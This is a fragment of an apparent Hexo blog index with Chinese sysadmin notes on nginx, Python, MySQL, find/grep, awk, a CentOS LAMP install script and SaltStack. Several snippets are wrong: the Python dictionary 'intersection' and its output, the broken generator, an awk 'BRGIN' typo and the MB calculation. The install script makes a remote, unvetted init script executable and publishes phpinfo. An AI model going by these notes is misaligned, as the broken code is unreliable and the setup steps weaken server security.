      <link href="/2015/08/25/linux/%E5%BC%80%E5%90%AFnginx%E7%BC%93%E5%AD%98/"/>
      <url>/2015/08/25/linux/%E5%BC%80%E5%90%AFnginx%E7%BC%93%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<p>proxy_cache_path和proxy_cache可以开启基础缓存<br>proxy_cache_path：缓存路径<br>proxy_cache：用来启用缓存</p>]]></content>
      
      
      <categories>
          
          <category> nginx </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python常用</title>
      <link href="/2015/08/10/python/python%E5%B8%B8%E7%94%A8/"/>
      <url>/2015/08/10/python/python%E5%B8%B8%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>取得字典的交集</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; a=&#123;<span class="string">'a'</span><span class="symbol">:</span><span class="number">1</span>,<span class="string">'b'</span><span class="symbol">:</span><span class="number">2</span>,<span class="string">'c'</span><span class="symbol">:</span><span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; b=&#123;<span class="string">'a'</span><span class="symbol">:</span><span class="number">2</span>,<span class="string">'c'</span><span class="symbol">:</span><span class="number">3</span>,<span class="string">'d'</span><span class="symbol">:</span><span class="number">4</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; dict(a.viewitems(), b.viewitems())</span><br><span class="line">&#123;<span class="string">'c'</span>: <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure><p>获取当前可用变量</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">locals()</span><br></pre></td></tr></table></figure><p>生成器的应用yield</p><figure class="highlight plain"><figcaption><span>fab(max):</span></figcaption><table><tr><td class="code"><pre><span class="line">n,x,y = 0,0,1</span><br><span class="line">if n &gt; max</span><br><span class="line">yield y</span><br><span class="line">x,y = y,x+y</span><br><span class="line">n=n+1</span><br></pre></td></tr></table></figure><p>生成器结束时抛出StopIteration 异常 在for中不影响运行<br>fab是生成器函数<br>fab（10）是fab返回的一个生成器<br><strong><span style="color: #ff0000;">生成器可用于读取大文件</span></strong></p><p>导入包的方法<br>1.</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">f, filename, <span class="keyword">description</span> = imp.find_module(<span class="string">'re'</span>)</span><br><span class="line">re = imp.load_module(<span class="string">'re'</span>, f, filename, <span class="keyword">description</span>)</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">re</span> = __import__(<span class="string">'re'</span>)</span><br></pre></td></tr></table></figure><p>3.</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">filename</span> = <span class="string">"mo.py"</span></span><br><span class="line"><span class="attr">f</span> = open(filename )</span><br><span class="line"><span class="attr">description</span> = (<span class="string">'.py'</span>, <span class="string">'U'</span>, <span class="number">1</span>)</span><br><span class="line"><span class="attr">mo</span> = imp.load_module(<span class="string">'some'</span>, f, filename, description)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql语句优化</title>
      <link href="/2015/08/10/mysql/mysql%E8%AF%AD%E5%8F%A5%E4%BC%98%E5%8C%96/"/>
      <url>/2015/08/10/mysql/mysql%E8%AF%AD%E5%8F%A5%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>1、请不要在SELECT中使用DISTINCT； #会用到临时表</p><p>2、尽可能不要SELECT *，而应该查询需要用到的指定几个字段；</p><p>3、不要对两个大表进行联合，无论是内联或外联。对于需要对两个或多个表进行联合查询的情况，可以做两次或多次数据库查询；</p><p>4、在WHERE条件中，尽可能对同类型的数据列进行比较；</p><p>5、在WHERE条件中，尽量让有索引的数据列在比较表达始中单独出现；</p><p>6、在WHERE条件中，根据数据列排除不合条件数据量由多到少的次序排列条件，在不能确定排除数据多少的前提下，一般来说表达式中使用=、!=、&lt;&gt;要优先于&gt;、&lt;、&gt;=、&lt;=，更优先于LIKE；<br>  如果WHERE条件中的值是数字，那么不要使用单引号进行类型转换；如果WHERE条件中使用LIKE模式匹配，不要在模式开头使用通配符%；</p><p>7、不要对WHERE条件中的非BINARY属性的CHAR/VARCHAR字段，进行大小写转换；</p><p>8、尽可能不要在SELECT中使用GROUP BY，如果确实有必要，请与主管联系确认；<br>来源： <a href="http://www.cnblogs.com/siqi/p/3625885.html" target="_blank" rel="noopener">http://www.cnblogs.com/siqi/p/3625885.html</a></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql优化</title>
      <link href="/2015/08/10/mysql/mysql%E4%BC%98%E5%8C%96/"/>
      <url>/2015/08/10/mysql/mysql%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>优化从几个方面来说：<br>表结构设计<br>适当索引（主键 普通 唯一 全文组合）<br>mysql本身配置<br>硬件配置<br>SQL语句优化 存储过程<br>分表 分区<br>读写分离<br>清理垃圾数据</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php优化思路</title>
      <link href="/2015/08/10/php/php%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF/"/>
      <url>/2015/08/10/php/php%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>优化思路：<br>    瓶颈在哪里？<br>    1     网络<br>    2    CPU<br>    3    共享存储（共享存储主要在通讯进程中发挥作用，或者是用于储存公共资源（比如多个CPU间的缓存数据或代码）。如果共享存储分配不足，同样将导致瓶颈的发生）<br>    4    文件系统（读写）<br>    5    进程管理<br>    6    连接到其它服务器</p><p>性能优化：<a href="http://www.open-open.com/lib/view/open1370769825070.html" target="_blank" rel="noopener">http://www.open-open.com/lib/view/open1370769825070.html</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>find  grep</title>
      <link href="/2015/08/10/linux/find%20%20grep/"/>
      <url>/2015/08/10/linux/find%20%20grep/</url>
      
        <content type="html"><![CDATA[<p>————————————-find—grep—————————————-<br>在当前目录下所有文件中查找内容包含 string 的文件:<br>find ./ -name “*” -exec grep “string” {} ;<br>注意:在最后不能加 print ,否则会出错.</p><p>在当前目录下所有文件中查找内容包含 string 的文件并列出字符所在的文件:<br>find ./ -name “*” -exec grep -l “string” {} ;</p><p>在当前目录下 <em>.c 中查找内容包含 string 的文件并列出字符所在的文件的所在行(不显示文件名):<br>find ./ -name “</em>.c” -exec grep -n “string” {} ;</p><p>在当前目录下所有文件中查找内容包含 string 的文件并列出字符所在的文件,所在行及所在行的内容:<br>find ./ -name “*” -exec grep -n “string” ./ {} ;</p><p>使用 find 查找时希望忽略某个目录(-prune)：<br>如果希望在 /app 目录下查找文件， 但不希望在 /app/bin 目录下查找：<br>find /app -name “/app/bin” -prune -o -print</p><p>使用 type 选项：<br>如果要在 /etc 目录下查找所有的目录：<br>find /etc -type d -print</p><p>如果要在 /etc 目录下查找 .svn 的目录：<br>find /etc -name .svn -type d -print</p><p>为了在当前目录下查找除目录以外的所有类型的文件：<br>find . ! -type d -print</p><p>为了在当前目录下查找所有的符号链接文件， 可以用：<br>find . -type l -print</p><p>find .  -mtime -4（4天内）/4(4天前的那一天)/+4（5天前）</p><p>find         -name<br>                -size   +50k<br>                -type    f/b/c/d/l/sp…<br>                -perm    -/+ /    755<br>                -uid/user      201/yangsf<br>                -gid/group    501/yangsf<br>                -nouser/nogroup   </p><p>===========================================================<br>为了用 ls -l 命令列出所匹配到的文件， 可以把 ls -l 命令放在find命令的 -exec 选项中：<br>find . -type f -exec ls -l {} ;</p><p>注： f 表示普通文件<br>    exec 选项后面跟随着所要执行的命令， 然后是一对 {}， 一个空格和一个 \，最后是一个分号。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> find </tag>
            
            <tag> grep </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>awk</title>
      <link href="/2015/08/10/linux/awk/"/>
      <url>/2015/08/10/linux/awk/</url>
      
        <content type="html"><![CDATA[<p>引用：<a href="http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2858470.html" target="_blank" rel="noopener">http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2858470.html</a></p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">awk [-F <span class="string">':'</span> ]  <span class="string">'&#123;print $1&#125;'</span>  filename</span><br><span class="line">cat filename | awk [-F <span class="string">':'</span> ]  <span class="string">'&#123;print $1&#125;'</span></span><br><span class="line">[root<span class="variable">@local</span> yang]<span class="comment"># tail  /etc/passwd |awk -F ':' 'BRGIN &#123;print "name,shell"&#125; &#123;print $1"---"$7&#125; END &#123;print "nameEND,shellEND"&#125;'</span></span><br><span class="line">ntp---<span class="regexp">/sbin/nologin</span></span><br><span class="line">apache---<span class="regexp">/sbin/nologin</span></span><br><span class="line">saslauth---<span class="regexp">/sbin/nologin</span></span><br><span class="line">postfix---<span class="regexp">/sbin/nologin</span></span><br><span class="line">pulse---<span class="regexp">/sbin/nologin</span></span><br><span class="line">nameEND,shellEND</span><br><span class="line">搜索并打印所在行</span><br><span class="line">[root<span class="variable">@local</span> yang]<span class="comment"># awk -F: '/root/' /etc/passwd    #红色部分为正则</span></span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">operator:</span><span class="symbol">x:</span><span class="number">11</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:operator</span><span class="symbol">:/root</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$0</span>变量是指整条记录。<span class="variable">$1</span>表示当前行的第一个域,<span class="variable">$2</span>表示当前行的第二个域,......以此类推</span><br><span class="line"></span><br><span class="line">搜索并打印所在行（过滤输出）</span><br><span class="line">[root<span class="variable">@local</span> yang]<span class="comment"># awk -F: '/root/&#123;print $1&#125;' /etc/passwd</span></span><br><span class="line">root</span><br><span class="line">operator</span><br><span class="line">内置变量</span><br><span class="line">ARGC               命令行参数个数</span><br><span class="line">ARGV               命令行参数排列</span><br><span class="line">ENVIRON            支持队列中系统环境变量的使用</span><br><span class="line">FILENAME           awk浏览的文件名（输入是文件的时候才会有文件名 如果是搜索别的命令的输出 则不会有文件名）</span><br><span class="line">FNR                浏览文件的记录数</span><br><span class="line">FS                 设置输入域分隔符，等价于命令行 -F选项</span><br><span class="line">NF                 浏览记录的域的个数（列）</span><br><span class="line">NR                 已读的记录数（行）</span><br><span class="line">OFS                输出域分隔符</span><br><span class="line">ORS                输出记录分隔符</span><br><span class="line">RS                 控制记录分隔符</span><br><span class="line">变量输出示例</span><br><span class="line">[root<span class="variable">@local</span> yang]<span class="comment"># awk -F: '&#123;print "filename:"FILENAME "  no:"NR "  cols:"NF&#125;'  /etc/passwd</span></span><br><span class="line"><span class="symbol">filename:</span>/etc/passwd  <span class="symbol">no:</span><span class="number">1</span>  <span class="symbol">cols:</span><span class="number">7</span></span><br><span class="line"><span class="symbol">filename:</span>/etc/passwd  <span class="symbol">no:</span><span class="number">2</span>  <span class="symbol">cols:</span><span class="number">7</span></span><br><span class="line">......</span><br><span class="line">使用printf</span><br><span class="line">[root<span class="variable">@local</span> yang]<span class="comment"># awk -F: '&#123;printf("filename:%s no:%s cols:%s %s\n",FILENAME,NR,NF,$0)&#125;'  /etc/passwd</span></span><br><span class="line"><span class="symbol">filename:</span>/etc/passwd <span class="symbol">no:</span><span class="number">1</span> <span class="symbol">cols:</span><span class="number">7</span> <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">filename:</span>/etc/passwd <span class="symbol">no:</span><span class="number">2</span> <span class="symbol">cols:</span><span class="number">7</span> <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">filename:</span>/etc/passwd <span class="symbol">no:</span><span class="number">3</span> <span class="symbol">cols:</span><span class="number">7</span> <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:daemon</span><span class="symbol">:/sbin</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">filename:</span>/etc/passwd <span class="symbol">no:</span><span class="number">4</span> <span class="symbol">cols:</span><span class="number">7</span> <span class="symbol">adm:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">4</span><span class="symbol">:adm</span><span class="symbol">:/var/adm</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">filename:</span>/etc/passwd <span class="symbol">no:</span><span class="number">5</span> <span class="symbol">cols:</span><span class="number">7</span> <span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">filename:</span>/etc/passwd <span class="symbol">no:</span><span class="number">6</span> <span class="symbol">cols:</span><span class="number">7</span> <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:sync</span><span class="symbol">:/sbin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">filename:</span>/etc/passwd <span class="symbol">no:</span><span class="number">7</span> <span class="symbol">cols:</span><span class="number">7</span> <span class="symbol">shutdown:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:shutdown</span><span class="symbol">:/sbin</span><span class="symbol">:/sbin/shutdown</span></span><br><span class="line">......</span><br><span class="line">awk编程</span><br><span class="line"></span><br><span class="line">变量示例</span><br><span class="line">[root<span class="variable">@local</span> yang]<span class="comment"># awk -F: '&#123;cnt++;print cnt,$1&#125;END&#123;print"cnt:"cnt&#125;'  /etc/passwd</span></span><br><span class="line"><span class="number">1</span> root</span><br><span class="line"><span class="number">2</span> bin</span><br><span class="line"><span class="number">3</span> daemon</span><br><span class="line"><span class="number">7</span> shutdown</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="number">35</span> www</span><br><span class="line"><span class="number">36</span> mysql</span><br><span class="line"><span class="symbol">cnt:</span><span class="number">36</span></span><br><span class="line">统计文件夹下文件占用字节数(不含子文件夹)</span><br><span class="line">[root<span class="variable">@local</span> yang]<span class="comment"># ll| awk 'BEGIN &#123;size=0&#125;&#123;size=size+$5&#125;END&#123;print"total size:"size&#125;'</span></span><br><span class="line">total <span class="symbol">size:</span><span class="number">126062</span></span><br><span class="line">以M计算</span><br><span class="line">[root<span class="variable">@local</span> yang]<span class="comment"># ll| awk 'BEGIN &#123;size=0&#125;&#123;size=size+$5&#125;END&#123;print"total size:"size/1024/1024"M"&#125;'</span></span><br><span class="line">total <span class="symbol">size:</span><span class="number">126062</span></span><br><span class="line">循环</span><br><span class="line">[root<span class="variable">@local</span> node_modules]<span class="comment"># awk -F ':' 'BEGIN &#123;count=1;&#125; &#123;name[count] = $1;count++;&#125;; END&#123;for (i = 1; i &amp;lt; NR+1; i++) print i, name[i]&#125;' /etc/passwd</span></span><br><span class="line"><span class="number">1</span> root</span><br><span class="line"><span class="number">2</span> bin</span><br><span class="line">......</span><br><span class="line">awk分割大文件并</span><br><span class="line"> awk <span class="string">'NR%12==1&#123;close(p".txt");++p&#125;&#123;print &gt; p".txt"&#125;'</span>    filename</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos6.6 install</title>
      <link href="/2015/08/10/linux/centos6.6%20install/"/>
      <url>/2015/08/10/linux/centos6.6%20install/</url>
      
        <content type="html"><![CDATA[<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">rpm -Uvh  http:<span class="string">//dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</span></span><br><span class="line">rpm <span class="params">--import</span> http:<span class="string">//elrepo.org/RPM-GPG-KEY-elrepo.org</span></span><br><span class="line">rpm -Uvh http:<span class="string">//www.elrepo.org/elrepo-release-6-6.el6.elrepo.noarch.rpm</span> </span><br><span class="line"><span class="comment">#yum update -y</span></span><br><span class="line">yum install kernel-devel  vim gcc cmake  -y</span><br><span class="line"></span><br><span class="line"><span class="comment">#openresty(nginx)</span></span><br><span class="line">mkdir <span class="string">/data/src</span> -p</span><br><span class="line"><span class="keyword">cd</span> <span class="string">/data/src/</span></span><br><span class="line">wget http:<span class="string">//openresty.org/download/ngx_openresty-1.5.12.1.tar.gz</span></span><br><span class="line">tar zxvf  ngx_openresty-1.5.12.1.tar.gz</span><br><span class="line"><span class="keyword">cd</span> ngx_openresty-1.5.12.1</span><br><span class="line">yum install readline-devel pcre-devel openssl-devel -y</span><br><span class="line">yum install gcc gcc-c++ -y</span><br><span class="line"><span class="string">./configure</span> <span class="params">--with-luajit</span> -j2</span><br><span class="line">make -j2</span><br><span class="line">make install</span><br><span class="line">groupadd www</span><br><span class="line">useradd www -g www -M -s <span class="string">/sbin/nologin</span></span><br><span class="line">mv <span class="string">/usr/local/openresty/nginx/conf/nginx.conf</span> <span class="string">/usr/local/openresty/nginx/conf/nginx.conf.bak</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/usr/local/openresty/nginx/conf/</span></span><br><span class="line">wget  http:<span class="string">//1.myconf.sinaapp.com/linux_install/nginx.conf.txt</span>   -O  <span class="string">/usr/local/openresty/nginx/conf/nginx.conf</span></span><br><span class="line">wget http:<span class="string">//1.myconf.sinaapp.com/linux_install/fastcgi_parms.txt</span> -O  <span class="string">/usr/local/openresty/nginx/conf/fastcgi_params</span></span><br><span class="line"></span><br><span class="line">mkdir vhosts</span><br><span class="line"><span class="keyword">cd</span> vhosts</span><br><span class="line">wget http:<span class="string">//1.myconf.sinaapp.com/linux_install/default.conf.txt</span> -O <span class="string">/usr/local/openresty/nginx/conf/vhosts/default.conf</span></span><br><span class="line">wget http:<span class="string">//1.myconf.sinaapp.com/linux_install/nginX.txt</span> -O <span class="string">/etc/init.d/nginx</span></span><br><span class="line">chmod u+x <span class="string">/etc/init.d/nginx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mysql </span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/data/src</span></span><br><span class="line">wget http:<span class="string">//1.myconf.sinaapp.com/linux_install/mysql-5.5.37.tar.gz</span></span><br><span class="line">tar zxvf mysql-5.5.37.tar.gz</span><br><span class="line"><span class="keyword">cd</span> mysql-5.5.37</span><br><span class="line">cmake  -DCMAKE_BUILD_TYPE<span class="function">:STRING</span>=Release -DMYSQL_USER=mysql -DCMAKE_INSTALL_PREFIX=<span class="string">/usr/local/mysql</span> -DMYSQL_DATADIR=<span class="string">/data/mysql</span> -DSYSCONFDIR=<span class="string">/etc</span> -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 -DWITH_ARCHIVE_STORAGE_ENGINE=1 -DWITH_BLACKHOLE_STORAGE_ENGINE=1 -DWITH_FEDERATED_STORAGE_ENGINE=1 -DWITH_PARTITION_STORAGE_ENGINE=1 -DWITH_READLINE=1 -DMYSQL_UNIX_ADDR=<span class="string">/data/mysql/mysql.sock</span> -DMYSQL_TCP_PORT=3306 -DENABLED_LOCAL_INFILE=1 -DWITH_PARTITION_STORAGE_ENGINE=1 -DEXTRA_CHARSETS=all -DWITH_SSL=yes -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci</span><br><span class="line">make &amp;amp;&amp;amp; make install</span><br><span class="line">mv <span class="string">/etc/my.cnf</span> <span class="string">/etc/my.cnf.bak</span></span><br><span class="line">cp support-files/my-medium.cnf <span class="string">/etc/my.cnf</span></span><br><span class="line">wget http:<span class="string">//1.myconf.sinaapp.com/linux_install/my.cnf.txt</span> -O <span class="string">/etc/my.cnf</span></span><br><span class="line">cp support-files/mysql.server <span class="string">/etc/init.d/mysqld</span></span><br><span class="line">chmod 755 <span class="string">/etc/init.d/mysqld</span></span><br><span class="line">chkconfig <span class="params">--add</span> mysqld</span><br><span class="line">chkconfig mysqld on</span><br><span class="line">groupadd mysql</span><br><span class="line">useradd mysql -g mysql -M -s <span class="string">/sbin/nologin</span></span><br><span class="line">mkdir <span class="string">/data/mysql</span></span><br><span class="line">chown mysql<span class="function">:mysql</span> <span class="string">/data/mysql</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/usr/local/mysql</span></span><br><span class="line"><span class="string">./scripts/mysql_install_db</span> <span class="params">--user=mysql</span>  <span class="params">--datadir=/data/mysql</span></span><br><span class="line">service mysqld restart</span><br><span class="line">chkconfig <span class="params">--add</span> mysqld</span><br><span class="line">chkconfig mysqld on</span><br><span class="line"></span><br><span class="line"><span class="comment">#php </span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/data/src</span></span><br><span class="line">wget http:<span class="string">//cn2.php.net/distributions/php-5.6.7.tar.gz</span></span><br><span class="line">tar zxvf php-5.6.7.tar.gz</span><br><span class="line"><span class="keyword">cd</span> php-5.6.7</span><br><span class="line">yum install libxml2-devel libcurl-devel libjpeg-devel libpng-devel freetype-devel openldap-devel libmcrypt-devel -y</span><br><span class="line">cp -frp <span class="string">/usr/lib64/libldap</span>* <span class="string">/usr/lib</span></span><br><span class="line">ln -s <span class="string">/usr/local/mysql/lib/libmysqlclient.so.18</span> <span class="string">/usr/lib</span></span><br><span class="line">ldconfig</span><br><span class="line"><span class="string">./configure</span> <span class="params">--enable-fpm</span> <span class="params">--enable-cgi</span> <span class="params">--prefix=/usr/local/php</span> <span class="params">--with-mysql=/usr/local/mysql/</span> <span class="params">--with-iconv-dir=/usr/local</span> <span class="params">--with-freetype-dir</span> <span class="params">--with-jpeg-dir=/usr/lib</span> <span class="params">--with-png-dir=/usr/lib</span> <span class="params">--with-zlib</span> <span class="params">--with-libxml-dir=/usr</span> <span class="params">--enable-xml</span> <span class="params">--disable-rpath</span> <span class="params">--enable-bcmath</span> <span class="params">--enable-shmop</span> <span class="params">--enable-sysvsem</span> <span class="params">--with-curl</span> <span class="params">--enable-mbregex</span> <span class="params">--enable-mbstring</span> <span class="params">--with-gd</span> <span class="params">--enable-gd-native-ttf</span> <span class="params">--with-openssl</span> <span class="params">--with-mhash</span> <span class="params">--enable-pcntl</span> <span class="params">--with-ldap</span> <span class="params">--with-ldap-sasl</span> <span class="params">--with-xmlrpc</span> <span class="params">--enable-zip</span> <span class="params">--enable-soap</span> <span class="params">--with-mysqli=/usr/local/mysql/bin/mysql_config</span> <span class="params">--with-pdo-mysql=/usr/local/mysql</span></span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">cp php.ini-production <span class="string">/usr/local/php/lib/php.ini</span> -f</span><br><span class="line">cp sapi/fpm/init.d.php-fpm <span class="string">/etc/init.d/php-fpm</span>  -f</span><br><span class="line">chmod u+x <span class="string">/etc/init.d/php-fpm</span> </span><br><span class="line"><span class="keyword">cd</span> <span class="string">/usr/local/php/etc/</span></span><br><span class="line">cp php-fpm.conf.default php-fpm.conf   -f</span><br><span class="line">sed -i  's/nobody/www/g'  <span class="string">/usr/local/php/etc/php-fpm.conf</span></span><br><span class="line">mkdir <span class="string">/data/www</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&amp;lt;?php phpinfo();"</span> &amp;gt;<span class="string">/data/www/index.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/data/src/</span></span><br><span class="line"><span class="comment">#wget http://downloads.zend.com/guard/7.0.0/zend-loader-php5.6-linux-x86_64.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="string">/etc/init.d/nginx</span> restart</span><br><span class="line"><span class="string">/etc/init.d/php-fpm</span> restart</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>saltstack入门</title>
      <link href="/2015/08/10/devops/saltstack%E5%85%A5%E9%97%A8/"/>
      <url>/2015/08/10/devops/saltstack%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>主master</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">yum <span class="keyword">install</span> <span class="keyword">salt</span>-<span class="keyword">master</span> <span class="keyword">salt</span>-<span class="keyword">master</span> -d</span><br></pre></td></tr></table></figure><p>客户端client</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install salt-minion</span><br></pre></td></tr></table></figure><p>在客户端的/etc/salt/minion 里面填写主的ip地址<br>salt-minion-d<br>客户端启动后会主动请求服务端是否信任<br>服务端确认是否添加信任</p><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">salt-key -A # 全部添加</span><br><span class="line"><span class="function"><span class="title">salt</span></span>-key -a <span class="string">'...'</span> #添加信任某个主机</span><br><span class="line"><span class="function"><span class="title">salt</span></span>-key -d <span class="string">'...'</span> #删除信任某个主机</span><br></pre></td></tr></table></figure><p>列出信任</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">salt-key -L</span></span><br></pre></td></tr></table></figure><p>给客户端定义组</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>salt<span class="regexp">/master</span></span><br></pre></td></tr></table></figure><p>命令格式 salt 【客户端】 【命令】 【参数】<br>过滤【客户端】</p><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">\* 全部</span><br><span class="line"><span class="params">-G</span> <span class="string">'os:centos'</span> 全部centos系统的</span><br><span class="line"><span class="string">'10.10.102.*'</span></span><br><span class="line"><span class="params">...</span><span class="params">...</span></span><br></pre></td></tr></table></figure><p>【命令】</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">cmd.run</span><br><span class="line">test.ping</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</span><br></pre></td></tr></table></figure><p>自定义模块</p><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/srv/salt/_modules/</span></span><br><span class="line">vim m1.py</span><br><span class="line">salt <span class="string">\*</span> saltutil.sync_all <span class="comment"># 同步至客户端</span></span><br><span class="line">salt <span class="string">\*</span> m1.run <span class="comment"># 执行</span></span><br></pre></td></tr></table></figure><p>参考<a href="http://rfyiamcool.blog.51cto.com/1030776/1262537" target="_blank" rel="noopener">http://rfyiamcool.blog.51cto.com/1030776/1262537</a></p>]]></content>
      
      
      <categories>
          
          <category> saltstack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql存储过程详解</title>
      <link href="/2013/08/01/mysql/mysql%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E8%AF%A6%E8%A7%A3/"/>
      <url>/2013/08/01/mysql/mysql%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>mysql存储过程详解</p><ol><li>存储过程简介</li></ol><p>我们常用的操作数据库语言SQL语句在执行的时候需要要先编译，然后执行，而存储过程（Stored Procedure）是一组为了完成特定功能的SQL语句集，经编译后存储在数据库中，用户通过指定存储过程的名字并给定参数（如果该存储过程带有参数）来调用执行它。</p><p>一个存储过程是一个可编程的函数，它在数据库中创建并保存。它可以有SQL语句和一些特殊的控制结构组成。当希望在不同的应用程序或平台上执行相同的函数，或者封装特定功能时，存储过程是非常有用的。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式。</p><p>存储过程通常有以下优点：</p><p>(1).存储过程增强了SQL语言的功能和灵活性。存储过程可以用流控制语句编写，有很强的灵活性，可以完成复杂的判断和较复杂的运算。</p><p>(2).存储过程允许标准组件是编程。存储过程被创建后，可以在程序中被多次调用，而不必重新编写该存储过程的SQL语句。而且数据库专业人员可以随时对存储过程进行修改，对应用程序源代码毫无影响。</p><p>(3).存储过程能实现较快的执行速度。如果某一操作包含大量的Transaction-SQL代码或分别被多次执行，那么存储过程要比批处理的执行速度快很多。因为存储过程是预编译的。在首次运行一个存储过程时查询，优化器对其进行分析优化，并且给出最终被存储在系统表中的执行计划。而批处理的Transaction-SQL语句在每次运行时都要进行编译和优化，速度相对要慢一些。</p><p>(4).存储过程能过减少网络流量。针对同一个数据库对象的操作（如查询、修改），如果这一操作所涉及的Transaction-SQL语句被组织程存储过程，那么当在客户计算机上调用该存储过程时，网络中传送的只是该调用语句，从而大大增加了网络流量并降低了网络负载。</p><p>(5).存储过程可被作为一种安全机制来充分利用。系统管理员通过执行某一存储过程的权限进行限制，能够实现对相应的数据的访问权限的限制，避免了非授权用户对数据的访问，保证了数据的安全。</p><ol 